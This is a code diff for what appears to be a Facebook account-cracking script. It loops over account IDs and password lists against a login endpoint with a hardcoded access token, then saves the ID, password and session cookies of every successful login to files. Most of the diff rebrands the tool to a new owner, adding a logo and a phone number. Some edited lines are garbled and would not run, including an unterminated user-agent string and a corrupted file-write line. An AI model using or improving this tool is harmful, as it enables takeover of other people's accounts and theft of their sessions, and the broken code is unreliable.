@@ -39,18 +39,24 @@ B = "\033[96;1m"
 P = "\033[1;95m"
 #-----(logo)-----
 logo = """
-  Y88b   d88P     d8888  .d8888b. 8888888 8888888b.  
-   Y88b d88P     d88888 d88P  Y88b  888   888   Y88b 
-    \033[1;95mY88o88P     d88P888 Y88b.       888   888    888 
-   \033[1;95m  Y888P     d88P 888  "Y888b.    888   888   d88P 
-      \033[96;1m888     d88P  888     "Y88b.  888   8888888P"  
-      \033[96;1m888    d88P   888       "888  888   888 T88b   
-      \033[1;37m888   d8888888888 Y88b  d88P  888   888  T88b  
-      \033[1;37m888  d88P     888  "Y8888P" 8888888 888   T88b 
+  
+               ___           ___           ___           ___     
+              /  /\         /  /\         /  /\         /__/\    
+             /  /::|       /  /::\       /  /::\        \  \:\   
+            /  /:|:|      /  /:/\:\     /  /:/\:\        \  \:\  
+           /  /:/|:|__   /  /::\ \:\   /  /::\ \:\        \  \:\ 
+          /__/:/_|::::\ /__/:/\:\_\:\ /__/:/\:\_\:\  ______\__\:\
+          \__\/  /~~/:/ \__\/  \:\/:/ \__\/  \:\/:/ \  \::::::::/
+                /  /:/       \__\::/       \__\::/   \  \:\~~~~~ 
+               /  /:/        /  /:/        /  /:/     \  \:\     
+              /__/:/        /__/:/        /__/:/       \  \:\    
+              \__\/         \__\/         \__\/         \__\/    
+
 
 \x1b[1;97m-------------------------------------------------------
-   [•] Owner        :  YASIR                    
-   [•] Facebook     :  Yasir
+   [•] Owner        :  MAAZ                    
+   [•] Facebook     :  Malik Maaz 
+   [•] WhatsApp     : 03014258613
    [•] Tool         :  personal
 \x1b[1;97m-------------------------------------------------------
    \x1b[1;92m[\x1b[1;97m  PTFRIAPR1231617CST2022CBILHTIW46HCR10225 \x1b[1;92m ]\x1b[1;97m
@@ -58,7 +64,8 @@ logo = """
 
 
 #---------(main ua Strings)------
-hehehe = "[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36]"
+hehehe = "[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',]"
 #--------(hehehe)-----
 def flight():
     print(f'\033[1;31m[•] If No Result use Flight Mode')
@@ -128,7 +135,7 @@ def M1(ids, names, passlist):
     try:
         global oks, loop
         sys.stdout.write(
-            f'\r\r\033[1;37m{G}[YASIR]{W} %s | OK | \033[1;32m{G}%s{W}\033[1;37m' % (loop, len(oks)))
+            f'\r\r\033[1;37m{G}[MAAZ]{W} %s | OK | \033[1;32m{G}%s{W}\033[1;37m' % (loop, len(oks)))
         sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
@@ -142,7 +149,8 @@ def M1(ids, names, passlist):
             access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
             ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10, 99))+".0.0."+str(random.randint(1000, 9999))+";FBBV/"+str(random.randint(1000000, 9999999))+";"+hehehe
       
-            headers = {'authority': 'm.facebook.com',
+            headers = {
+            'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-PK,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'cache-control': 'max-age=0',
@@ -159,9 +167,8 @@ def M1(ids, names, passlist):
             'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',
-                         }
+            'user-agent': 'pro
+                   }
             data = {
                             'adid': '1DBdDC6FAd1053AB',
                             'format': 'json',
@@ -190,18 +197,18 @@ def M1(ids, names, passlist):
             twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
             po = requests.post(url, data=data, headers=headers).json()
             if 'session_key' in po:
-                print('\r\r\033[1;32m[YASIR-OK] ' + ids + ' | ' + pas + '\033[1;97m')
+                print('\r\r\033[1;32m[MAAZ-OK] ' + ids + ' | ' + pas + '\033[1;97m')
                 coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                open('/sdcard/YASIR-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
-                open('/sdcard/YASIR-OK.txt', 'a').write(ids + '|' + pas + '\n')
+          client_country_code'MAAZ-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+                open('/sdcard/MAAZ-OK.txt', 'a').write(ids + '|' + pas + '\n')
                 oks.append(ids)
                 break
             elif twf in str(po):
-                print('\r\r\033[1;36m[YASIR-2F] ' + ids + ' | ' + pas)
+                print('\r\r\033[1;36m[MAAZ-2F] ' + ids + ' | ' + pas)
                 twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                open('/sdcard/YASIR-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                open('/sdcard/MAAZ-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 cps.append(ids)
                 break
             else:
